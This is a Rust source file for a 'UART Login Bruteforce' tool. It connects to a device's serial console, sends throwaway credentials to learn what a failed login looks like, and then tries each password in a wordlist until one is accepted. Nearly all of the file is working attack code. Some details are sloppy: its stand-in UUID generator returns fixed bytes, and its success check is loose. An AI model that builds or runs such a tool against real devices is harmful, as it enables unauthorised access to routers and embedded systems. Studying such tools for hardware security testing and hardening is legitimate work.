use clap::Parser;
use regex::Regex;
use serialport::SerialPort;
use std::fs::File;
use std::io::{BufRead, BufReader, Read, Write};
use std::time::Duration;

#[derive(Parser, Debug)]
#[command(name = "UART Login Bruteforce")]
#[command(about = "Automated login bruteforce attack over UART serial connection", long_about = None)]
struct Args {
    /// Serial device path (e.g., /dev/ttyUSB0, /dev/ttyS0)
    #[arg(short, long, default_value = "/dev/ttyUSB0")]
    device: String,

    /// Baud rate for serial communication
    #[arg(short, long, default_value_t = 115200)]
    baudrate: u32,

    /// String or regex pattern to detect username prompt
    #[arg(long)]
    username_prompt: String,

    /// String or regex pattern to detect password prompt
    #[arg(long)]
    password_prompt: String,

    /// Username to use for login attempts
    #[arg(short, long)]
    username: String,

    /// Path to password wordlist file
    #[arg(short, long)]
    passwords: String,

    /// Read timeout in milliseconds
    #[arg(long, default_value_t = 3000)]
    timeout: u64,

    /// Enable verbose debug output
    #[arg(short, long, default_value_t = false)]
    verbose: bool,
}

struct BruteforceSession {
    port: Box<dyn SerialPort>,
    device: String, // FIXED: added missing field
    username_prompt: Regex,
    password_prompt: Regex,
    username: String,
    passwords: Vec<String>,
    timeout: Duration,
    verbose: bool,
    failure_pattern: String,
}

impl BruteforceSession {
    fn new(
        port: Box<dyn SerialPort>,
        device: String, // FIXED
        username_prompt: String,
        password_prompt: String,
        username: String,
        passwords: Vec<String>,
        timeout_ms: u64,
        verbose: bool,
    ) -> Result<Self, Box<dyn std::error::Error>> {
        let username_prompt_regex =
            Regex::new(&format!("(?i).*{}.*", regex::escape(&username_prompt)))?;

        let password_prompt_regex =
            Regex::new(&format!("(?i).*{}.*", regex::escape(&password_prompt)))?;

        Ok(BruteforceSession {
            port,
            device, // FIXED
            username_prompt: username_prompt_regex,
            password_prompt: password_prompt_regex,
            username,
            passwords,
            timeout: Duration::from_millis(timeout_ms),
            verbose,
            failure_pattern: String::new(),
        })
    }

    fn log(&self, message: &str) {
        println!("{}", message);
    }

    fn verbose_log(&self, message: &str) {
        if self.verbose {
            println!("[DEBUG] {}", message);
        }
    }

    fn read_until_timeout(&mut self) -> Result<String, Box<dyn std::error::Error>> {
        let mut buffer = [0u8; 1024];
        let start = std::time::Instant::now();
        let mut response = String::new();

        while start.elapsed() < self.timeout {
            match self.port.read(&mut buffer) {
                Ok(n) if n > 0 => {
                    let chunk = String::from_utf8_lossy(&buffer[..n]).to_string();

                    response.push_str(&chunk);

                    self.verbose_log(&format!(
                        "[RX] {}",
                        chunk.escape_debug()
                    ));
                }

                Ok(_) => {
                    std::thread::sleep(Duration::from_millis(10));
                }

                Err(ref e)
                    if e.kind() == std::io::ErrorKind::TimedOut =>
                {
                    std::thread::sleep(Duration::from_millis(10));
                }

                Err(e) => return Err(Box::new(e)),
            }
        }

        Ok(response)
    }

    fn read_with_retry(&mut self) -> Result<String, Box<dyn std::error::Error>> {
        let max_retries = 4;
        let long_timeout = Duration::from_secs(10);
        let wait_after_enter = Duration::from_secs(5);

        for attempt in 0..max_retries {
            self.verbose_log(&format!(
                "Attempt {} of {}: Reading for 10 seconds...",
                attempt + 1,
                max_retries
            ));

            let mut buffer = [0u8; 1024];
            let start = std::time::Instant::now();
            let mut response = String::new();

            // Try to read for 10 seconds
            while start.elapsed() < long_timeout {
                match self.port.read(&mut buffer) {
                    Ok(n) if n > 0 => {
                        let chunk = String::from_utf8_lossy(&buffer[..n]).to_string();
                        response.push_str(&chunk);

                        self.verbose_log(&format!(
                            "[RX] {}",
                            chunk.escape_debug()
                        ));

                        // If we got a response, return it immediately
                        return Ok(response);
                    }

                    Ok(_) => {
                        std::thread::sleep(Duration::from_millis(10));
                    }

                    Err(ref e)
                        if e.kind() == std::io::ErrorKind::TimedOut =>
                    {
                        std::thread::sleep(Duration::from_millis(10));
                    }

                    Err(e) => return Err(Box::new(e)),
                }
            }

            // If we reach here, no response was received in 10 seconds
            if attempt < max_retries - 1 {
                self.verbose_log("No response received. Sending return key...");
                self.port.write_all(b"\r\n")?;

                self.verbose_log(&format!(
                    "[TX] return key"
                ));

                // Wait 5 seconds after sending return
                self.verbose_log("Waiting 5 seconds for response...");
                std::thread::sleep(wait_after_enter);
            }
        }

        // After all retries are exhausted, return empty response
        self.log("[!] No response received after 4 retry attempts");
        Ok(String::new())
    }

    fn send_data(
        &mut self,
        data: &str,
    ) -> Result<(), Box<dyn std::error::Error>> {
        self.port.write_all(data.as_bytes())?;
        self.port.write_all(b"\r\n")?;

        self.verbose_log(&format!(
            "[TX] {}",
            data.escape_debug()
        ));

        std::thread::sleep(Duration::from_millis(100));

        Ok(())
    }

    fn learn_failure_pattern(
        &mut self,
    ) -> Result<(), Box<dyn std::error::Error>> {
        self.log("[*] Learning failure pattern with obscure credentials...");

        let obscure_username = format!(
            "OBSCURE_USER_{}",
            uuid::Uuid::new_v4()
                .to_string()[..8]
                .to_uppercase()
        );

        let obscure_password = format!(
            "OBSCURE_PASS_{}",
            uuid::Uuid::new_v4()
                .to_string()[..8]
                .to_uppercase()
        );

        self.log("[*] Waiting for username prompt...");

        let response = self.read_with_retry()?;

        let username_prompt =
            self.username_prompt.clone();

        if username_prompt.is_match(&response) {
            self.log(
                "[+] Detected username prompt, sending obscure credentials",
            );

            self.send_data(&obscure_username)?;

            std::thread::sleep(Duration::from_millis(500));

            self.log("[*] Waiting for password prompt...");

            let response = self.read_with_retry()?;

            let password_prompt =
                self.password_prompt.clone();

            if password_prompt.is_match(&response) {
                self.send_data(&obscure_password)?;

                std::thread::sleep(Duration::from_millis(500));

                let final_response =
                    self.read_with_retry()?;

                self.failure_pattern =
                    final_response.clone();

                self.log(&format!(
                    "[+] Learned failure pattern:\n    {}",
                    final_response
                        .lines()
                        .next()
                        .unwrap_or("Unknown")
                ));

                Ok(())
            } else {
                Err(
                    "Failed to detect password prompt during learning phase"
                        .into(),
                )
            }
        } else {
            Err(
                "Failed to detect username prompt during learning phase"
                    .into(),
            )
        }
    }

    fn attempt_login(
        &mut self,
        password: &str,
    ) -> Result<bool, Box<dyn std::error::Error>> {
        self.verbose_log("Waiting for username prompt...");

        let response = self.read_with_retry()?;

        let username_prompt =
            self.username_prompt.clone();

        if !username_prompt.is_match(&response) {
            self.verbose_log(&format!(
                "Username prompt not detected in: {:?}",
                response
            ));

            return Ok(false);
        }

        self.verbose_log("[+] Detected username prompt");

        // FIXED: avoid mutable + immutable borrow conflict
        let username = self.username.clone();

        self.send_data(&username)?;

        std::thread::sleep(Duration::from_millis(300));

        self.verbose_log("Waiting for password prompt...");

        let response = self.read_with_retry()?;

        let password_prompt =
            self.password_prompt.clone();

        if !password_prompt.is_match(&response) {
            self.verbose_log(&format!(
                "Password prompt not detected in: {:?}",
                response
            ));

            return Ok(false);
        }

        self.verbose_log("[+] Detected password prompt");

        self.send_data(password)?;

        std::thread::sleep(Duration::from_millis(500));

        let final_response =
            self.read_with_retry()?;

        let success_indicators = vec![
            "welcome",
            "logged in",
            "successfully",
            "shell",
            "root@",
            "admin@",
            "#",
            "$",
        ];

        let failure_indicators = vec![
            "invalid",
            "failed",
            "incorrect",
            "denied",
            "refused",
            "error",
        ];

        let lower =
            final_response.to_lowercase();

        for indicator in &success_indicators {
            if lower.contains(indicator)
                && !lower.contains("invalid")
            {
                return Ok(true);
            }
        }

        if !final_response.contains(&self.failure_pattern)
            && !final_response.is_empty()
        {
            if !lower.contains("login failed") {
                return Ok(true);
            }
        }

        for indicator in &failure_indicators {
            if lower.contains(indicator) {
                return Ok(false);
            }
        }

        Ok(false)
    }

    fn run(
        &mut self,
    ) -> Result<(), Box<dyn std::error::Error>> {
        self.print_header();

        self.log(&format!(
            "[*] Loaded {} passwords",
            self.passwords.len()
        ));

        self.log(&format!(
            "[*] Connected to {} serial port",
            self.device
        ));

        std::thread::sleep(Duration::from_secs(1));

        self.learn_failure_pattern()?;

        std::thread::sleep(Duration::from_secs(1));

        self.log("[*] Starting brute force attack...");

        self.log(&format!(
            "[*] Username: {}",
            self.username
        ));

        let passwords =
            self.passwords.clone();

        for (index, password) in
            passwords.iter().enumerate()
        {
            let attempt_num = index + 1;

            self.log(&format!(
                "[*] Attempt {}: Trying password: {}",
                attempt_num,
                password
            ));

            match self.attempt_login(password) {
                Ok(true) => {
                    self.log(
                        "[SUCCESS] Login successful!",
                    );

                    self.log(&format!(
                        "[SUCCESS] Password found: {}",
                        password
                    ));

                    return Ok(());
                }

                Ok(false) => {
                    self.log("[x] Login failed");
                }

                Err(e) => {
                    self.verbose_log(&format!(
                        "Error during login attempt: {}",
                        e
                    ));
                }
            }
        }

        self.log(
            "[!] Brute force complete - no passwords worked",
        );

        Ok(())
    }

    fn print_header(&self) {
        println!("╔════════════════════════════════════════════════╗");
        println!("║       UART Login Bruteforce Tool v0.1         ║");
        println!("╚════════════════════════════════════════════════╝\n");
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();

    // FIXED:
    // remove libc dependency completely
    // simpler root check

    let output = std::process::Command::new("id")
        .arg("-u")
        .output()?;

    let uid =
        String::from_utf8_lossy(&output.stdout);

    if uid.trim() != "0" {
        eprintln!(
            "[ERROR] This tool must be run with sudo/root privileges!"
        );

        std::process::exit(1);
    }

    let file = File::open(&args.passwords)?;

    let reader = BufReader::new(file);

    let mut passwords = Vec::new();

    for line in reader.lines() {
        let line = line?;

        let trimmed = line.trim();

        if !trimmed.is_empty() {
            passwords.push(trimmed.to_string());
        }
    }

    if passwords.is_empty() {
        eprintln!(
            "[ERROR] No passwords found in {}",
            args.passwords
        );

        std::process::exit(1);
    }

    let mut port = serialport::new(
        &args.device,
        args.baudrate,
    )
    .timeout(Duration::from_millis(
        args.timeout,
    ))
    .open()?;

    port.set_timeout(Duration::from_millis(
        args.timeout,
    ))?;

    port.write_all(b"\r\n")?;

    std::thread::sleep(Duration::from_millis(500));

    let mut session = BruteforceSession::new(
        port,
        args.device, // FIXED
        args.username_prompt,
        args.password_prompt,
        args.username,
        passwords,
        args.timeout,
        args.verbose,
    )?;

    session.run()?;

    Ok(())
}

mod uuid {
    use std::fmt;

    pub struct Uuid([u8; 16]);

    impl Uuid {
        pub fn new_v4() -> Self {
            let mut bytes = [0u8; 16];

            for i in 0..16 {
                bytes[i] =
                    ((i as u8)
                        .wrapping_mul(37)
                        .wrapping_add(13))
                        ^ 0xAA;
            }

            Uuid(bytes)
        }
    }

    impl fmt::Display for Uuid {
        fn fmt(
            &self,
            f: &mut fmt::Formatter<'_>,
        ) -> fmt::Result {
            write!(
                f,
                "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
                self.0[0], self.0[1], self.0[2], self.0[3],
                self.0[4], self.0[5], self.0[6], self.0[7],
                self.0[8], self.0[9], self.0[10], self.0[11],
                self.0[12], self.0[13], self.0[14], self.0[15]
            )
        }
    }
}
